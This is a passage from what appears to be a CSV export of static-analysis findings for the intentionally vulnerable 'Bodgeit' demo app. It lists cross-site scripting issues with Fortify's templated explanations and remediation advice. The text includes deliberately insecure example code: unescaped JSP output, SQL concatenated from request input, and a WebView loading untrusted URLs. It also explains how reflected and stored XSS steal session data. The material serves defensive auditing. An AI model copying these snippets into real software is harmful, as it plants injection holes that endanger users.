If the database is a trusted resource in your environment, use custom filters to filter out dataflow issues that include the DATABASE taint flag or originate from database sources. Nonetheless, it is often still a good idea to validate everything read from the database. 2.Even though URL encoding untrusted data protects against many XSS attacks, some browsers (specifically, Internet Explorer 6 and 7 and possibly others) automatically decode content at certain locations within the Document Object Model (DOM) prior to passing it to the JavaScript interpreter. To reflect this danger, the rulepacks no longer treat URL encoding routines as sufficient to protect against cross-site scripting. Data values that are URL encoded and subsequently output will cause Fortify to report Cross-Site Scripting: Poor Validation vulnerabilities. 3.Fortify RTA adds protection against this category.","","",""
"DemoApps","","Bodgeit","116","Cross-Site Scripting: Reflected","","Critical","Open","2015-10-15","Fortify SCA","79","Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')","A3","root/contact.jsp","username","","http://localhost/root/contact.jsp","","","","Abstract: <Content><Paragraph>The method <Replace key=""EnclosingFunction.name""/> in <Replace key=""PrimaryLocation.file""/> sends unvalidated data to a web browser on line <Replace key=""PrimaryLocation.line""/>, which can result in the browser executing malicious code.<AltParagraph>Sending unvalidated data to a web browser can result in the browser executing malicious code.</AltParagraph></Paragraph></Content> Explanation: <Content>Cross-site scripting (XSS) vulnerabilities occur when: 1. Data enters a web application through an untrusted source. In the case of Reflected XSS, the untrusted source is typically a web request, while in the case of Persisted (also known as Stored) XSS it is typically a database or other back-end datastore. <Paragraph> In this case the data enters at <Replace key=""SourceFunction"" link=""SourceLocation""/> in <Replace key=""SourceLocation.file""/> at line <Replace key=""SourceLocation.line""/>. </Paragraph> 2. The data is included in dynamic content that is sent to a web user without being validated. <Paragraph> In this case the data is sent at <Replace key=""SinkFunction"" link=""SinkLocation""/> in <Replace key=""SinkLocation.file""/> at line <Replace key=""SinkLocation.line""/>. </Paragraph> The malicious content sent to the web browser often takes the form of a segment of JavaScript, but may also include HTML, Flash or any other type of code that the browser may execute. The variety of attacks based on XSS is almost limitless, but they commonly include transmitting private data like cookies or other session information to the attacker, redirecting the victim to web content controlled by the attacker, or performing other malicious operations on the user's machine under the guise of the vulnerable site. <IfNotDef var=""ConditionalDescriptions""> <b>Example 1:</b> The following JSP code segment reads an employee ID, <code>eid</code>, from an HTTP request and displays it to the user. <pre> &lt;% String eid = request.getParameter(""eid""); %&gt; ... Employee ID: &lt;%= eid %&gt; </pre> </IfNotDef> <IfDef var=""ConditionalDescriptions""><Paragraph> <ConditionalText condition=""sink:java.io sink:javax.servlet trace:!jsp""> <b>Example 1:</b> The following code reads an employee ID, <code>eid</code>, from an HTTP servlet request, then displays the value back to the user in the servlet's response. <pre> String eid = request.getParameter(""eid""); ... ServletOutputStream out = response.getOutputStream(); out.print(""Employee ID: "" + eid); ... out.close(); ... </pre> </ConditionalText> <ConditionalText condition=""trace:java.sun.com/jsp/jstl""> <b>Example 1:</b> The following JSP code segment reads an employee ID, <code>eid</code>, from an HTTP request and displays it to the user via the <code>&lt;c:out/&gt;</code> tag. By setting <code>escapeXml=""false""</code>, it does not perform even basic checking for potentially malicious data. <pre> Employee ID: &lt;c:out value=""${param.eid}"" escapeXml=""false""/&gt; </pre> </ConditionalText> <ConditionalText condition=""trace:java.sun.com/jsf trace:myfaces.apache.org/trinidad trace:myfaces.apache.org/tomahawk""> <b>Example 1:</b> The following code reads an employee ID, <code>eid</code>, from a JSF form. <pre> ... &lt;h:form&gt; Enter employee ID: &lt;h:inputText value=""#{eid}""/&gt; &lt;/h:form&gt; ... </pre> Its response page then reads the value of <code>eid</code> and displays it to the user. <pre> ... Employee ID: &lt;h:outputText value=""#{eid}"" escape=""false""/&gt; ... </pre> </ConditionalText> <ConditionalText condition=""trace:java.sun.com/jsp/jstl/fmt/message sink:jspwriter""> <b>Example 1:</b> The following code reads an employee ID, <code>eid</code>, from an HTTP request, then checks the value for this key in bundle. If the key doesn't exist, the default functionality is to print the key to the user. <pre> &lt;fmt:setLocale value=""en""/&gt; &lt;fmt:setBundle basename=""com.company.Names"" var=""names""/&gt; Employee ID: &lt;fmt:message key=""${param.eid}"" bundle=""${names}""/&gt; </pre> </ConditionalText> <ConditionalText condition=""sink:_jspService sink:_jspInit sink:jspwriter trace:!/jsf|jstl|myfaces/""> <b>Example 1:</b> The following JSP code segment reads an employee ID, <code>eid</code>, from an HTTP request and displays it to the user. <pre> &lt;% String eid = request.getParameter(""eid""); %&gt; ... Employee ID: &lt;%= eid %&gt; </pre> </ConditionalText> <ConditionalText condition=""sink:!/java\.io|javax\.servlet|_jspInit|_jspService|jspwriter/""> <b>Example 1:</b> The following JSP code segment reads an employee ID, <code>eid</code>, from an HTTP request and displays it to the user. <pre> &lt;% String eid = request.getParameter(""eid""); %&gt; ... Employee ID: &lt;%= eid %&gt; </pre> </ConditionalText> </Paragraph></IfDef> The code in this example operates correctly if <code>eid</code> contains only standard alphanumeric text. If <code>eid</code> has a value that includes meta-characters or source code, then the code will be executed by the web browser as it displays the HTTP response. Initially this might not appear to be much of a vulnerability. After all, why would someone enter a URL that causes malicious code to run on their own computer? The real danger is that an attacker will create the malicious URL, then use e-mail or social engineering tricks to lure victims into visiting a link to the URL. When victims click the link, they unwittingly reflect the malicious content through the vulnerable web application back to their own computers. This mechanism of exploiting vulnerable web applications is known as Reflected XSS. <IfNotDef var=""ConditionalDescriptions""> <b>Example 2:</b> The following JSP code segment queries a database for an employee with a given ID and prints the corresponding employee's name. <pre> &lt;%... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); if (rs != null) { rs.next(); String name = rs.getString(""name""); } %&gt; Employee Name: &lt;%= name %&gt; </pre> </IfNotDef> <IfDef var=""ConditionalDescriptions""><Paragraph> <ConditionalText condition=""sink:java.io sink:javax.servlet trace:!jsp""> <b>Example 2:</b> The following code segment queries a database for an employee with a given ID and prints the corresponding employee's name in the servlet's response. <pre> ... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); if (rs != null) { rs.next(); String name = rs.getString(""name""); } ServletOutputStream out = response.getOutputStream(); out.print(""Employee Name: "" + name); ... out.close(); ... </pre> </ConditionalText> <ConditionalText condition=""trace:java.sun.com/jsp/jstl""> <b>Example 2:</b> The following JSP code segment queries a database for an employee with a given ID and prints the corresponding employee's name via the <code>&lt;c:out/&gt;</code> tag. By setting <code>escapeXml=""false""</code>, it does not perform even basic checking for potentially malicious data. <pre> &lt;%... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); if (rs != null) { rs.next(); String name = rs.getString(""name""); } %&gt; Employee Name: &lt;c:out value=""${name}"" escapeXml=""false""/&gt; </pre> </ConditionalText> <ConditionalText condition=""trace:java.sun.com/jsp/jstl/fmt/message sink:jspwriter""> <b>Example 2:</b> The following JSP code segment queries a database for an employee with a given ID and looks up the corresponding employee's name in a bundle via the <code>key</code> attribute within the <code>&lt;fmt:message/&gt;</code> tag. If the key does not exist, the value passed to <code>key</code> gets printed to the page. <pre> &lt;%... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); if (rs != null) { rs.next(); String name = rs.getString(""name""); } %&gt; &lt;fmt:setLocale value=""en""/&gt; &lt;fmt:setBundle basename=""com.company.Names"" var=""names""/&gt; Employee Name: &lt;fmt:message key=""&lt;%= name %&gt;"" bundle=""${names}""/&gt; </pre> </ConditionalText> <ConditionalText condition=""trace:java.sun.com/jsf trace:myfaces.apache.org/trinidad trace:myfaces.apache.org/tomahawk""> <b>Example 2:</b> The following code first queries a database for an employee with a given ID, converts the results into a list, and stores the list inside <code>employeesBean</code>. <pre> public class employeesBean { private List&lt;EmployeeData&gt; employeeList; ... public List&lt;EmployeeData&gt; getEmployeeList() { ... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); return convertToList(rs); } ... } </pre> Then it uses JSF's <code>dataTable</code> construct to print the corresponding employee's name. <pre> &lt;f:view&gt; ... &lt;h:dataTable value=""employeesBean.employeeList"" var=""employee""&gt; ... &lt;h:column&gt; &lt;f:facet name=""header""&gt; &lt;h:outputText value=""Employee Name""/&gt; &lt;/f:facet&gt; &lt;h:outputText value=""#{employee.name}"" escape=""false""/&gt; &lt;/h:column&gt; ... &lt;/h:dataTable&gt; ... &lt;/f:view&gt; </pre> </ConditionalText> <ConditionalText condition=""sink:_jspService sink:_jspInit sink:jspwriter trace:!/jsf|jstl|myfaces/""> <b>Example 2:</b> The following JSP code segment queries a database for an employee with a given ID and prints the corresponding employee's name. <pre> &lt;%... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); if (rs != null) { rs.next(); String name = rs.getString(""name""); } %&gt; Employee Name: &lt;%= name %&gt; </pre> </ConditionalText> <ConditionalText condition=""sink:!/java\.io|javax\.servlet|_jspInit|_jspService|jspwriter/""> <b>Example 2:</b> The following JSP code segment queries a database for an employee with a given ID and prints the corresponding employee's name. <pre> &lt;%... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); if (rs != null) { rs.next(); String name = rs.getString(""name""); } %&gt; Employee Name: &lt;%= name %&gt; </pre> </ConditionalText> </Paragraph></IfDef> As in Example 1, this code functions correctly when the values of <code>name</code> are well-behaved, but it does nothing to prevent exploits if they are not. Again, this code can appear less dangerous because the value of <code>name</code> is read from a database, whose contents are apparently managed by the application. However, if the value of <code>name</code> originates from user-supplied data, then the database can be a conduit for malicious content. Without proper input validation on all data stored in the database, an attacker can execute malicious commands in the user's web browser. This type of exploit, known as Persistent (or Stored) XSS, is particularly insidious because the indirection caused by the data store makes it more difficult to identify the threat and increases the possibility that the attack will affect multiple users. XSS got its start in this form with web sites that offered a ""guestbook"" to visitors. Attackers would include JavaScript in their guestbook entries, and all subsequent visitors to the guestbook page would execute the malicious code. Some think that in the mobile world, classic web application vulnerabilities, such as cross-site scripting, do not make sense -- why would the user attack themself? However, keep in mind that the essence of mobile platforms is applications that are downloaded from various sources and run alongside each other on the same device. The likelihood of running a piece of malware next to a banking application is high, which necessitates expanding the attack surface of mobile applications to include inter-process communication. <b>Example 3:</b> The following code enables JavaScript in Android's WebView (by default, JavaScript is disabled) and loads a page based on the value received from an Android intent. <pre> ... WebView webview = (WebView) findViewById(R.id.webview); webview.getSettings().setJavaScriptEnabled(true); String url = this.getIntent().getExtras().getString(""url""); webview.loadUrl(url); ... </pre> If the value of <code>url</code> starts with <code>javascript:</code>, JavaScript code that follows will execute within the context of the web page inside WebView. As the examples demonstrate, XSS vulnerabilities are caused by code that includes unvalidated data in an HTTP response. There are three vectors by which an XSS attack can reach a victim: - As in Example 1, data is read directly from the HTTP request and reflected back in the HTTP response. Reflected XSS exploits occur when an attacker causes a user to supply dangerous content to a vulnerable web application, which is then reflected back to the user and executed by the web browser. The most common mechanism for delivering malicious content is to include it as a parameter in a URL that is posted publicly or e-mailed directly to victims. URLs constructed in this manner constitute the core of many phishing schemes, whereby an attacker convinces victims to visit a URL that refers to a vulnerable site. After the site reflects the attacker's content back to the user, the content is executed and proceeds to transfer private information, such as cookies that may include session information, from the user's machine to the attacker or perform other nefarious activities. - As in Example 2, the application stores dangerous data in a database or other trusted data store. The dangerous data is subsequently read back into the application and included in dynamic content. Persistent XSS exploits occur when an attacker injects dangerous content into a data store that is later read and included in dynamic content. From an attacker's perspective, the optimal place to inject malicious content is in an area that is displayed to either many users or particularly interesting users. Interesting users typically have elevated privileges in the application or interact with sensitive data that is valuable to the attacker. If one of these users executes malicious content, the attacker may be able to perform privileged operations on behalf of the user or gain access to sensitive data belonging to the user. - As in Example 3, a source outside the application stores dangerous data in a database or other data store, and the dangerous data is subsequently read back into the application as trusted data and included in dynamic content. <IfDef var=""ConditionalDescriptions""><Paragraph> <ConditionalText condition=""tracenode:form field validator tracenode:action form declaration tracenode:action declaration tracenode:action field validator tracenode:command class validator"">A number of modern web frameworks provide mechanisms for performing validation of user input. Struts and Spring MVC are among them. To highlight the unvalidated sources of input, the rulepacks dynamically re-prioritize the issues reported by HPE Security Fortify Static Code Analyzer by lowering their probability of exploit and providing pointers to the supporting evidence whenever the framework validation mechanism is in use. We refer to this feature as Context-Sensitive Ranking. To further assist the HPE Security Fortify user with the auditing process, the HPE Security Fortify Software Security Research Group makes available the Data Validation project template that groups the issues into folders based on the validation mechanism applied to their source of input.</ConditionalText> </Paragraph></IfDef> <IfNotDef var=""ConditionalDescriptions""> A number of modern web frameworks provide mechanisms for performing validation of user input. Struts and Spring MVC are among them. To highlight the unvalidated sources of input, the rulepacks dynamically re-prioritize the issues reported by HPE Security Fortify Static Code Analyzer by lowering their probability of exploit and providing pointers to the supporting evidence whenever the framework validation mechanism is in use. We refer to this feature as Context-Sensitive Ranking. To further assist the HPE Security Fortify user with the auditing process, the HPE Security Fortify Software Security Research Group makes available the Data Validation project template that groups the issues into folders based on the validation mechanism applied to their source of input. </IfNotDef></Content>","Recommendations: <Content>The solution to XSS is to ensure that validation occurs in the correct places and checks for the correct properties. Since XSS vulnerabilities occur when an application includes malicious data in its output, one logical approach is to validate data immediately before it leaves the application. However, because web applications often have complex and intricate code for generating dynamic content, this method is prone to errors of omission (missing validation). An effective way to mitigate this risk is to also perform input validation for XSS. Web applications must validate their input to prevent other vulnerabilities, such as SQL injection, so augmenting an application's existing input validation mechanism to include checks for XSS is generally relatively easy. Despite its value, input validation for XSS does not take the place of rigorous output validation. An application may accept input through a shared data store or other trusted source, and that data store may accept input from a source that does not perform adequate input validation. Therefore, the application cannot implicitly rely on the safety of this or any other data. This means the best way to prevent XSS vulnerabilities is to validate everything that enters the application and leaves the application destined for the user. The most secure approach to validation for XSS is to create a whitelist of safe characters that are allowed to appear in HTTP content and accept input composed exclusively of characters in the approved set. For example, a valid username might only include alpha-numeric characters or a phone number might only include digits 0-9. However, this solution is often infeasible in web applications because many characters that have special meaning to the browser should still be considered valid input once they are encoded, such as a web design bulletin board that must accept HTML fragments from its users. A more flexible, but less secure approach is known as blacklisting, which selectively rejects or escapes potentially dangerous characters before using the input. In order to form such a list, you first need to understand the set of characters that hold special meaning for web browsers. Although the HTML standard defines what characters have special meaning, many web browsers try to correct common mistakes in HTML and may treat other characters as special in certain contexts, which is why we do not encourage the use of blacklists as a means to prevent XSS. The CERT(R) Coordination Center at the Software Engineering Institute at Carnegie Mellon University provides the following details about special characters in various contexts [1]: In the content of a block-level element (in the middle of a paragraph of text): - ""&lt;"" is special because it introduces a tag. - ""&amp;"" is special because it introduces a character entity. - ""&gt;"" is special because some browsers treat it as special, on the assumption that the author of the page intended to include an opening ""&lt;"", but omitted it in error. The following principles apply to attribute values: - In attribute values enclosed with double quotes, the double quotes are special because they mark the end of the attribute value. - In attribute values enclosed with single quote, the single quotes are special because they mark the end of the attribute value. - In attribute values without any quotes, white-space characters, such as space and tab, are special. - ""&amp;"" is special when used with certain attributes, because it introduces a character entity. In URLs, for example, a search engine might provide a link within the results page that the user can click to re-run the search. This can be implemented by encoding the search query inside the URL, which introduces additional special characters: - Space, tab, and new line are special because they mark the end of the URL. - ""&amp;"" is special because it either introduces a character entity or separates CGI parameters. - Non-ASCII characters (that is, everything above 128 in the ISO-8859-1 encoding) are not allowed in URLs, so they are considered to be special in this context. - The ""%"" symbol must be filtered from input anywhere parameters encoded with HTTP escape sequences are decoded by server-side code. For example, ""%"" must be filtered if input such as ""%68%65%6C%6C%6F"" becomes ""hello"" when it appears on the web page in question. Within the body of a &lt;SCRIPT&gt; &lt;/SCRIPT&gt;: - Semicolons, parentheses, curly braces, and new line characters should be filtered out in situations where text could be inserted directly into a pre-existing script tag. Server-side scripts: - Server-side scripts that convert any exclamation characters (!) in input to double-quote characters ("") on output might require additional filtering. Other possibilities: - If an attacker submits a request in UTF-7, the special character '&lt;' appears as '+ADw-' and may bypass filtering. If the output is included in a page that does not explicitly specify an encoding format, then some browsers try to intelligently identify the encoding based on the content (in this case, UTF-7). Once you identify the correct points in an application to perform validation for XSS attacks and what special characters the validation should consider, the next challenge is to identify how your validation handles special characters. If special characters are not considered valid input to the application, then you can reject any input that contains special characters as invalid. A second option in this situation is to remove special characters with filtering. However, filtering has the side effect of changing any visual representation of the filtered content and may be unacceptable in circumstances where the integrity of the input must be preserved for display. If input containing special characters must be accepted and displayed accurately, validation must encode any special characters to remove their significance. A complete list of ISO 8859-1 encoded values for special characters is provided as part of the official HTML specification [2]. Many application servers attempt to limit an application's exposure to cross-site scripting vulnerabilities by providing implementations for the functions responsible for setting certain specific HTTP response content that perform validation for the characters essential to a cross-site scripting attack. Do not rely on the server running your application to make it secure. When an application is developed there are no guarantees about what application servers it will run on during its lifetime. As standards and known exploits evolve, there are no guarantees that application servers will also stay in sync.</Content> Tips: 1.The HPE Security Fortify Secure Coding Rulepacks warn about SQL Injection and Access Control: Database issues when untrusted data is written to a database and also treat the database as a source of untrusted data, which can lead to XSS vulnerabilities. If the database is a trusted resource in your environment, use custom filters to filter out dataflow issues that include the DATABASE taint flag or originate from database sources. Nonetheless, it is often still a good idea to validate everything read from the database. 2.Even though URL encoding untrusted data protects against many XSS attacks, some browsers (specifically, Internet Explorer 6 and 7 and possibly others) automatically decode content at certain locations within the Document Object Model (DOM) prior to passing it to the JavaScript interpreter. To reflect this danger, the rulepacks no longer treat URL encoding routines as sufficient to protect against cross-site scripting. Data values that are URL encoded and subsequently output will cause Fortify to report Cross-Site Scripting: Poor Validation vulnerabilities. 3.Fortify RTA adds protection against this category.","","",""
"DemoApps","","Bodgeit","132","Cross-Site Scripting: Persistent","","Critical","Open","2015-10-15","Fortify SCA,Checkmarx","79","Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')","A3","root/header.jsp","","","http://localhost/root/header.jsp","","","","Abstract: <Content><Paragraph>The method <Replace key=""EnclosingFunction.name""/> in <Replace key=""PrimaryLocation.file""/> sends unvalidated data to a web browser on line <Replace key=""PrimaryLocation.line""/>, which can result in the browser executing malicious code.<AltParagraph>Sending unvalidated data to a web browser can result in the browser executing malicious code.</AltParagraph></Paragraph></Content> Explanation: <Content>Cross-site scripting (XSS) vulnerabilities occur when: 1. Data enters a web application through an untrusted source. In the case of Persistent (also known as Stored) XSS, the untrusted source is typically a database or other back-end datastore, while in the case of Reflected XSS it is typically a web request. <Paragraph> In this case the data enters at <Replace key=""SourceFunction"" link=""SourceLocation""/> in <Replace key=""SourceLocation.file""/> at line <Replace key=""SourceLocation.line""/>. </Paragraph> 2. The data is included in dynamic content that is sent to a web user without being validated. <Paragraph> In this case the data is sent at <Replace key=""SinkFunction"" link=""SinkLocation""/> in <Replace key=""SinkLocation.file""/> at line <Replace key=""SinkLocation.line""/>. </Paragraph> The malicious content sent to the web browser often takes the form of a segment of JavaScript, but may also include HTML, Flash or any other type of code that the browser may execute. The variety of attacks based on XSS is almost limitless, but they commonly include transmitting private data like cookies or other session information to the attacker, redirecting the victim to web content controlled by the attacker, or performing other malicious operations on the user's machine under the guise of the vulnerable site. <IfNotDef var=""ConditionalDescriptions""> <b>Example 1:</b> The following JSP code segment queries a database for an employee with a given ID and prints the corresponding employee's name. <pre> &lt;%... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); if (rs != null) { rs.next(); String name = rs.getString(""name""); } %&gt; Employee Name: &lt;%= name %&gt; </pre> </IfNotDef> <IfDef var=""ConditionalDescriptions""><Paragraph> <ConditionalText condition=""sink:java.io sink:javax.servlet trace:!jsp""> <b>Example 1:</b> The following code segment queries a database for an employee with a given ID and prints the corresponding employee's name in the servlet response. <pre> ... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); if (rs != null) { rs.next(); String name = rs.getString(""name""); } ServletOutputStream out = response.getOutputStream(); out.print(""Employee Name: "" + name); ... out.close(); ... </pre> </ConditionalText> <ConditionalText condition=""trace:java.sun.com/jsp/jstl""> <b>Example 1:</b> The following JSP code segment queries a database for an employee with a given ID and prints the corresponding employee's name via the <code>&lt;c:out/&gt;</code> tag. By setting <code>escapeXml=""false""</code>, it does not perform even basic checking for potentially malicious data. <pre> &lt;%... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); if (rs != null) { rs.next(); String name = rs.getString(""name""); } %&gt; Employee Name: &lt;c:out value=""${name}"" escapeXml=""false""/&gt; </pre> </ConditionalText> <ConditionalText condition=""trace:java.sun.com/jsf trace:myfaces.apache.org/trinidad trace:myfaces.apache.org/tomahawk""> <b>Example 1:</b> The following code first queries a database for an employee with a given ID, converts the results into a list, and stores the list inside <code>employeesBean</code>. <pre> public class employeesBean { private List&lt;EmployeeData&gt; employeeList; ... public List&lt;EmployeeData&gt; getEmployeeList() { ... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); return convertToList(rs); } ... } </pre> Then it uses JSF's <code>dataTable</code> construct to print the corresponding employee's name. <pre> &lt;f:view&gt; ... &lt;h:dataTable value=""employeesBean.employeeList"" var=""employee""&gt; ... &lt;h:column&gt; &lt;f:facet name=""header""&gt; &lt;h:outputText value=""Employee Name""&gt; &lt;/f:facet&gt; &lt;h:outputText value=""#{employee.name}"" escape=""false""/&gt; &lt;/h:column&gt; ... &lt;/h:dataTable&gt; ... &lt;/f:view&gt;</pre> </ConditionalText> <ConditionalText condition=""sink:_jspService sink:_jspInit sink:jspwriter trace:!/jsf|jstl|myfaces/""> <b>Example 1:</b> The following JSP code segment queries a database for an employee with a given ID and prints the corresponding employee's name. <pre> &lt;%... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); if (rs != null) { rs.next(); String name = rs.getString(""name""); } %&gt; Employee Name: &lt;%= name %&gt; </pre> </ConditionalText> <ConditionalText condition=""sink:!/java\.io|javax\.servlet|_jspInit|_jspService|jspwriter/""> <b>Example 1:</b> The following JSP code segment queries a database for an employee with a given ID and prints the corresponding employee's name. <pre> &lt;%... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); if (rs != null) { rs.next(); String name = rs.getString(""name""); } %&gt; Employee Name: &lt;%= name %&gt; </pre> </ConditionalText> </Paragraph></IfDef> This code functions correctly when the values of <code>name</code> are well-behaved, but it does nothing to prevent exploits if they are not. This code can appear less dangerous because the value of <code>name</code> is read from a database, whose contents are apparently managed by the application. However, if the value of <code>name</code> originates from user-supplied data, then the database can be a conduit for malicious content. Without proper input validation on all data stored in the database, an attacker can execute malicious commands in the user's web browser. This type of exploit, known as Persistent (or Stored) XSS, is particularly insidious because the indirection caused by the data store makes it more difficult to identify the threat and increases the possibility that the attack will affect multiple users. XSS got its start in this form with web sites that offered a ""guestbook"" to visitors. Attackers would include JavaScript in their guestbook entries, and all subsequent visitors to the guestbook page would execute the malicious code. <IfNotDef var=""ConditionalDescriptions""> <b>Example 2:</b> The following JSP code segment reads an employee ID, <code>eid</code>, from an HTTP request and displays it to the user. <pre> &lt;% String eid = request.getParameter(""eid""); %&gt; ... Employee ID: &lt;%= eid %&gt; </pre> </IfNotDef> <IfDef var=""ConditionalDescriptions""><Paragraph> <ConditionalText condition=""sink:java.io sink:javax.servlet trace:!jsp""> <b>Example 2:</b> The following code reads an employee ID, <code>eid</code>, from an HTTP servlet request, then displays the value back to the user in the servlet's response. <pre> String eid = request.getParameter(""eid""); ... ServletOutputStream out = response.getOutputStream(); out.print(""Employee ID: "" + eid); ... out.close(); ... </pre> </ConditionalText> <ConditionalText condition=""trace:java.sun.com/jsp/jstl""> <b>Example 2:</b> The following JSP code segment reads an employee ID, <code>eid</code>, from an HTTP request and displays it to the user via the <code>&lt;c:out/&gt;</code> tag. By setting <code>escapeXml=""false""</code>, it does not perform even basic checking for potentially malicious data. <pre> Employee ID: &lt;c:out value=""${param.eid}"" escapeXml=""false""/&gt; </pre> </ConditionalText> <ConditionalText condition=""trace:java.sun.com/jsf trace:myfaces.apache.org/trinidad trace:myfaces.apache.org/tomahawk""> <b>Example 2:</b> The following code reads an employee ID, <code>eid</code>, from a JSF form. <pre> ... &lt;h:form&gt; Enter employee ID: &lt;h:inputText value=""#{eid}""/&gt; &lt;/h:form&gt; ... </pre> Its response page then reads the value of <code>eid</code> and displays it to the user. <pre> ... Employee ID: &lt;h:outputText value=""#{eid}"" escape=""false""/&gt; ... </pre> </ConditionalText> <ConditionalText condition=""sink:_jspService sink:_jspInit sink:jspwriter trace:!/jsf|jstl|myfaces/""> <b>Example 2:</b> The following JSP code segment reads an employee ID, <code>eid</code>, from an HTTP request and displays it to the user. <pre> &lt;% String eid = request.getParameter(""eid""); %&gt; ... Employee ID: &lt;%= eid %&gt; </pre> </ConditionalText> <ConditionalText condition=""sink:!/java\.io|javax\.servlet|_jspInit|_jspService|jspwriter/""> <b>Example 2:</b> The following JSP code segment reads an employee ID, <code>eid</code>, from an HTTP request and displays it to the user. <pre> &lt;% String eid = request.getParameter(""eid""); %&gt; ... Employee ID: &lt;%= eid %&gt;</pre> </ConditionalText> </Paragraph></IfDef> As in Example 1, this code operates correctly if <code>eid</code> contains only standard alphanumeric text. If <code>eid</code> has a value that includes meta-characters or source code, then the code will be executed by the web browser as it displays the HTTP response. Initially this might not appear to be much of a vulnerability. After all, why would someone enter a URL that causes malicious code to run on their own computer? The real danger is that an attacker will create the malicious URL, then use e-mail or social engineering tricks to lure victims into visiting a link to the URL. When victims click the link, they unwittingly reflect the malicious content through the vulnerable web application back to their own computers. This mechanism of exploiting vulnerable web applications is known as Reflected XSS. Some think that in the mobile world, classic web application vulnerabilities, such as cross-site scripting, do not make sense -- why would the user attack themself? However, keep in mind that the essence of mobile platforms is applications that are downloaded from various sources and run alongside each other on the same device. The likelihood of running a piece of malware next to a banking application is high, which necessitates expanding the attack surface of mobile applications to include inter-process communication. <b>Example 3:</b> The following code enables JavaScript in Android's WebView (by default, JavaScript is disabled) and loads a page based on the value received from an Android intent. <pre> ... WebView webview = (WebView) findViewById(R.id.webview); webview.getSettings().setJavaScriptEnabled(true); String url = this.getIntent().getExtras().getString(""url""); webview.loadUrl(url); ... </pre> If the value of <code>url</code> starts with <code>javascript:</code>, JavaScript code that follows will execute within the context of the web page inside WebView. As the examples demonstrate, XSS vulnerabilities are caused by code that includes unvalidated data in an HTTP response. There are three vectors by which an XSS attack can reach a victim: - As in Example 1, the application stores dangerous data in a database or other trusted data store. The dangerous data is subsequently read back into the application and included in dynamic content. Persistent XSS exploits occur when an attacker injects dangerous content into a data store that is later read and included in dynamic content. From an attacker's perspective, the optimal place to inject malicious content is in an area that is displayed to either many users or particularly interesting users. Interesting users typically have elevated privileges in the application or interact with sensitive data that is valuable to the attacker. If one of these users executes malicious content, the attacker may be able to perform privileged operations on behalf of the user or gain access to sensitive data belonging to the user. - As in Example 2, data is read directly from the HTTP request and reflected back in the HTTP response. Reflected XSS exploits occur when an attacker causes a user to supply dangerous content to a vulnerable web application, which is then reflected back to the user and executed by the web browser. The most common mechanism for delivering malicious content is to include it as a parameter in a URL that is posted publicly or e-mailed directly to victims. URLs constructed in this manner constitute the core of many phishing schemes, whereby an attacker convinces victims to visit a URL that refers to a vulnerable site. After the site reflects the attacker's content back to the user, the content is executed and proceeds to transfer private information, such as cookies that may include session information, from the user's machine to the attacker or perform other nefarious activities. - As in Example 3, a source outside the application stores dangerous data in a database or other data store, and the dangerous data is subsequently read back into the application as trusted data and included in dynamic content. <IfDef var=""ConditionalDescriptions""><Paragraph> <ConditionalText condition=""tracenode:form field validator tracenode:action form declaration tracenode:action declaration tracenode:action field validator tracenode:command class validator"">A number of modern web frameworks provide mechanisms for performing validation of user input. Struts and Spring MVC are among them. To highlight the unvalidated sources of input, the rulepacks dynamically re-prioritize the issues reported by HPE Security Fortify Static Code Analyzer by lowering their probability of exploit and providing pointers to the supporting evidence whenever the framework validation mechanism is in use. We refer to this feature as Context-Sensitive Ranking. To further assist the HPE Security Fortify user with the auditing process, the HPE Security Fortify Software Security Research Group makes available the Data Validation project template that groups the issues into folders based on the validation mechanism applied to their source of input.</ConditionalText> </Paragraph></IfDef> <IfNotDef var=""ConditionalDescriptions""> A number of modern web frameworks provide mechanisms for performing validation of user input. Struts and Spring MVC are among them. To highlight the unvalidated sources of input, the rulepacks dynamically re-prioritize the issues reported by HPE Security Fortify Static Code Analyzer by lowering their probability of exploit and providing pointers to the supporting evidence whenever the framework validation mechanism is in use. We refer to this feature as Context-Sensitive Ranking. To further assist the HPE Security Fortify user with the auditing process, the HPE Security Fortify Software Security Research Group makes available the Data Validation project template that groups the issues into folders based on the validation mechanism applied to their source of input. </IfNotDef></Content>","Recommendations: <Content>The solution to XSS is to ensure that validation occurs in the correct places and checks for the correct properties. Since XSS vulnerabilities occur when an application includes malicious data in its output, one logical approach is to validate data immediately before it leaves the application. However, because web applications often have complex and intricate code for generating dynamic content, this method is prone to errors of omission (missing validation). An effective way to mitigate this risk is to also perform input validation for XSS. Web applications must validate their input to prevent other vulnerabilities, such as SQL injection, so augmenting an application's existing input validation mechanism to include checks for XSS is generally relatively easy. Despite its value, input validation for XSS does not take the place of rigorous output validation. An application may accept input through a shared data store or other trusted source, and that data store may accept input from a source that does not perform adequate input validation. Therefore, the application cannot implicitly rely on the safety of this or any other data. This means the best way to prevent XSS vulnerabilities is to validate everything that enters the application and leaves the application destined for the user. The most secure approach to validation for XSS is to create a whitelist of safe characters that are allowed to appear in HTTP content and accept input composed exclusively of characters in the approved set. For example, a valid username might only include alpha-numeric characters or a phone number might only include digits 0-9. However, this solution is often infeasible in web applications because many characters that have special meaning to the browser should still be considered valid input once they are encoded, such as a web design bulletin board that must accept HTML fragments from its users. A more flexible, but less secure approach is known as blacklisting, which selectively rejects or escapes potentially dangerous characters before using the input. In order to form such a list, you first need to understand the set of characters that hold special meaning for web browsers. Although the 